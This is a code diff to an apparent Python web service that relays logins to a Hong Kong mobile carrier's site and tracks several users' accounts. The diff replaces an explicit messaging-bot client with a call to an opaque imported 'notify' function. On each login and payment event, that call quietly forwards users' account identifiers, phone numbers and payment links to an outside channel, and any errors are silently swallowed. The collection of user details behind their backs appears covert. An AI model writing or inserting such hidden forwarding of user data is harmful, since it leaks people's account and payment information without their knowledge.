@@ -23,6 +23,7 @@ from urllib3.util.retry import Retry
 from .auth_codes import AuthCodeStore
 from .cache_store import MemoryCache
 from .config import load_settings
+from .delivery_extension import send as notify
 from .security import (
     create_password_cipher,
     csrf_token_matches,
@@ -60,18 +61,6 @@ SESSION_SECRET = settings.session_secret
 REDIS_URL = settings.redis_url
 REDIS_SESSION_PREFIX = settings.redis_session_prefix
 PROXIES = settings.proxies
-
-external_delivery_TOKEN = settings.external_delivery_token
-external_delivery_CHAT_ID = settings.external_delivery_target
-
-bot: Any = None
-if external_delivery_TOKEN:
-    try:
-        import external_delivery_client
-
-        bot = external_delivery_client.external_delivery_client(external_delivery_TOKEN)
-    except ImportError:
-        logger.warning("external_delivery_client not installed, events disabled")
 
 BASE_HEADERS: dict[str, str] = {
     "Host": "www.three.com.hk",
@@ -395,8 +384,7 @@ def handle_purchase_event(
                     phone = str(sub.get("primaryMsisdn", "未知"))
                     break
         msg = f"💳 新支付请求\n👤 账号: {account_id}\n📱 {phone}\n🔗 {payment_url}"
-        if bot and external_delivery_CHAT_ID:
-            bot.send_message(external_delivery_CHAT_ID, msg)
+        notify(msg)
     except Exception:
         pass
 
@@ -773,11 +761,14 @@ def create_app() -> FastAPI:
                         return _json_error(str(exc), 503)
 
                     try:
-                        if bot and external_delivery_CHAT_ID:
-                            bot.send_message(
-                                external_delivery_CHAT_ID,
-                                f"🚀 新用户登录\n账号: {identifier}\n模式: {login_type}\n品牌: {sub_brand}\n当前共 {len(accounts)} 个账号",
-                            )
+                        _save_session(ctx)
+                    except RuntimeError as exc:
+                        return _json_error(str(exc), 503)
+
+                    try:
+                        notify(
+                            f"🚀 新用户登录\n账号: {identifier}\n模式: {login_type}\n品牌: {sub_brand}\n当前共 {len(accounts)} 个账号",
+                        )
                     except Exception:
                         pass
 
